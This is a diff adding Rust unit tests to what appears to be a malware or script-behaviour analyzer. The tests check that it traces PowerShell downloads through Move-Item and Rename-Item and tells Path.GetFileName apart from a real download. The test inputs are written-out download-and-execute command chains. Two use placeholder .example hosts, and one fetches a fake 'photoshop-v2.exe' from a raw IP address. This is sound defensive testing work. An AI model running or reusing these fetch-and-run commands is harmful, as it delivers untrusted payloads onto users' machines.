@@ -13441,6 +13441,50 @@ powershell -NoProfile -File "%TEMP%\copied.ps1""#,
     }
 
     #[test]
+    fn powershell_move_item_preserves_download_provenance() {
+        let report = analyze(
+            br#"powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://ps-move-item-provenance.example/stage.ps1','%TEMP%\downloaded.ps1')"
+powershell -Command "Move-Item -Path '%TEMP%\downloaded.ps1' -Destination '%TEMP%\moved.ps1'"
+powershell -NoProfile -File "%TEMP%\moved.ps1""#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd.contains("-File")
+                        && cmd.contains("moved.ps1")
+                        && url == "https://ps-move-item-provenance.example/stage.ps1"
+            )),
+            "PowerShell Move-Item script execution did not resolve original download URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_rename_item_preserves_download_provenance() {
+        let report = analyze(
+            br#"powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://ps-rename-item-provenance.example/stage.ps1','%TEMP%\downloaded.ps1')"
+powershell -Command "Rename-Item -Path '%TEMP%\downloaded.ps1' -NewName 'renamed.ps1'"
+powershell -NoProfile -File "%TEMP%\renamed.ps1""#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd.contains("-File")
+                        && cmd.contains("renamed.ps1")
+                        && url == "https://ps-rename-item-provenance.example/stage.ps1"
+            )),
+            "PowerShell Rename-Item script execution did not resolve original download URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn powershell_copy_item_preserves_script_content() {
         let mut env = Environment::new(&Config::default());
         let ps1 = b"Invoke-WebRequest https://ps-copy-content.example/stage.ps1".to_vec();
@@ -35916,6 +35960,38 @@ powershell -Command "tracert route-wrapper.example"
                 Trait::Download { src, .. } if src == "https://ps-task-query.example/p.exe?a=1&b=2"
             )),
             "PowerShell scheduled-task query ampersand URL was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_path_getfilename_url_is_not_a_download() {
+        let script = br#"set "url=http://185.209.21.111/download/photoshop-v2.exe"
+for /f "delims=" %%A in ('powershell -Command "[System.IO.Path]::GetFileName('%url%')"') do set "filename=%%A"
+powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%USERPROFILE%\Desktop\%%A'"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { cmd, src, .. }
+                        if cmd.contains("GetFileName") && src == "http://185.209.21.111/download/photoshop-v2.exe"
+                )
+            }),
+            "Path.GetFileName URL was promoted as a download: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { cmd, src, .. }
+                        if cmd.contains("Invoke-WebRequest") && src == "http://185.209.21.111/download/photoshop-v2.exe"
+                )
+            }),
+            "real Invoke-WebRequest download was lost: {:?}",
             report.traits
         );
     }
